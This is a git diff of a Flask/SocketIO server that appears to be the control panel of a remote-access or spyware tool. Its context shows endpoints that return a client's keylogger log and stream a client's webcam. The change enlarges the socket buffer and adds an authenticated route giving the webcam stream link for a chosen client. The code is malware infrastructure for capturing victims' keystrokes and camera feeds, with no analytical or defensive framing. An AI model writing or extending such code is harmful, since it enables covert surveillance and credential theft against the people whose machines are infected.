@@ -27,7 +27,7 @@ migrate = Migrate(app, db)
 jwt = JWTManager(app)
 video_frames = Queue()
 
-socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading', max_http_buffer_size=10 ** 8)
+socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading', max_http_buffer_size=50 ** 8)
 
 authorizations = {
     'bearer_auth': {
@@ -309,6 +309,17 @@ class GetKeyloggerLog(Resource):
         else:
             return {'status': 'error', 'message': 'Fichier du keylogger non trouvé.'}, 404
 
+
+@webcam_ns.route('/link/<int:client_id>')
+class GetWebcamLink(Resource):
+    @jwt_required()
+    @api.doc(security='bearer_auth')
+    def get(self, client_id):
+        client = Client.query.get(client_id)
+        if client:
+            return {'status': 'success', 'message': f'La webcam est disponible sur le lien suivant: /webcam/{client_id}'}, 200
+        else:
+            return {'status': 'error', 'message': 'Client non trouvé.'}, 404
 
 @webcam_ns.route('/<int:client_id>')
 class StreamWebcam(Resource):
